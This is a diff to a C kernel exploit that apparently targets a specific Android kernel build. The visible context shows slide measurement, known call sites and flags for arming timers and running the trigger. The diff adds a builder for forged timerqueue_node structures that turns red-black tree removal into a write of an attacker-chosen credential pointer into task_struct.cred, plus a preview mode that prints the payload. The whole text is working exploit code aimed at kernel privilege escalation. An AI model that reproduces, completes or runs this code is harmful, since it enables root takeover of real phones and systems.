@@ -57,7 +57,7 @@ static int write_str(const char *p, const char *v)
 
 static uint64_t g_slide;
 static int g_len36;
-static int g_dry, g_arm, g_delay = 120;
+static int g_dry, g_arm, g_delay = 120, g_preview;
 
 /* Known call sites for 6.18.21-android17-5-g805aa6adea19-abogki565292102-4k.
  * Each is (function entry + offset) as observed in the text trace; the offset
@@ -224,6 +224,68 @@ static int measure_slide(uint64_t *out)
 }
 
 
+
+/* ---------------- forged timerqueue_node payload ---------------- */
+
+/* struct rb_node { unsigned long __rb_parent_color; struct rb_node *rb_right; struct rb_node *rb_left; }
+ * struct timerqueue_node { struct rb_node node; ktime_t expires; }
+ * k_itimer layout on this build: `it` union at +0xe0, cpu_timer.node at +0 of it,
+ * so inside an 8 KiB reclaimed page the node sits at 0xe0 + n*0x180.            */
+#define SLOT        0x180
+#define NODE_OFF    0xe0
+#define RB_RIGHT    8
+#define RB_LEFT     16
+
+static void put64(unsigned char *p, uint64_t v) { memcpy(p, &v, 8); }
+
+/* Build the payload that plants `cred_addr` into `*(task+0x908)` on reap. */
+static int build_payload(unsigned char *buf, size_t len, uint64_t task, uint64_t cred)
+{
+    uint64_t target = task + 0x908;      /* task_struct.cred  (BTF + BRM agree) */
+    uint64_t parent = target - RB_RIGHT; /* -> the write lands at parent+8 = target */
+    size_t off;
+    int placed = 0;
+
+    memset(buf, 0, len);
+    for (off = NODE_OFF; off + 32 <= len; off += SLOT) {
+        /* node->__rb_parent_color = parent (color bits 0) */
+        put64(buf + off + 0, parent);
+        /* rb_right = the value that will be stored into target */
+        put64(buf + off + RB_RIGHT, cred);
+        /* rb_left must differ from `node`, which it does (0 != kernel address) */
+        put64(buf + off + RB_LEFT, 0);
+        /* expires: keep it far in the future so nothing re-inserts the node */
+        put64(buf + off + 24, 0);
+        placed++;
+    }
+    return placed;
+}
+
+static void preview_payload(uint64_t task, uint64_t cred)
+{
+    unsigned char buf[8192];
+    int n = build_payload(buf, sizeof(buf), task, cred);
+    size_t off = NODE_OFF;
+    int i;
+
+    printf("=== payload preview ===\n");
+    printf("  task_struct.cred target : 0x%016llx\n", (unsigned long long)(task + 0x908));
+    printf("  forged parent           : 0x%016llx  (target-8)\n", (unsigned long long)(task + 0x900));
+    printf("  value to plant (cred)   : 0x%016llx\n", (unsigned long long)cred);
+    printf("  node slots in 8 KiB page: %d  (offsets 0x%x + n*0x%x)\n", n, NODE_OFF, SLOT);
+    for (i = 0; i < 3 && i < n; i++) {
+        size_t o = NODE_OFF + (size_t)i * SLOT;
+        printf("  node[%d] @+0x%03zx: parent=0x%016llx right=0x%016llx left=0x%016llx\n",
+               i, o,
+               (unsigned long long)*(uint64_t *)(buf + o + 0),
+               (unsigned long long)*(uint64_t *)(buf + o + RB_RIGHT),
+               (unsigned long long)*(uint64_t *)(buf + o + RB_LEFT));
+    }
+    printf("  hexdump of the first node:\n   ");
+    for (i = 0; i < 32; i++) printf(" %02x", buf[off + i]);
+    printf("\n=== nothing was written to the kernel ===\n");
+}
+
 /* ---------------- trigger mechanics ---------------- */
 
 struct exec_ctx {
@@ -387,12 +449,19 @@ int main(int argc, char **argv)
 
     for (i = 1; i < argc; i++) {
         if (!strcmp(argv[i], "--preflight")) { print_preflight(); return 0; }
+        if (!strcmp(argv[i], "--payload-preview")) { g_preview = 1; }
         if (!strcmp(argv[i], "--arm-test")) return arm_test();
         if (!strcmp(argv[i], "--run")) do_run = 1;
         if (!strcmp(argv[i], "--dry-exec")) { g_dry = 1; do_run = 1; accept = 1; }
         if (!strcmp(argv[i], "--arm-timers")) g_arm = 1;
         if (!strcmp(argv[i], "--delay")) { if (i + 1 < argc) g_delay = atoi(argv[++i]); }
         if (!strcmp(argv[i], "--i-accept-reboot")) accept = 1;
+    }
+    if (g_preview) {
+        uint64_t task = 0xffffffe4d9d00000ULL;   /* placeholder: a real address comes from the leak */
+        uint64_t cred = 0xffffff8100000000ULL;   /* placeholder: a controlled kernel object      */
+        preview_payload(task, cred);
+        return 0;
     }
     if (do_run) {
         if (!accept) {
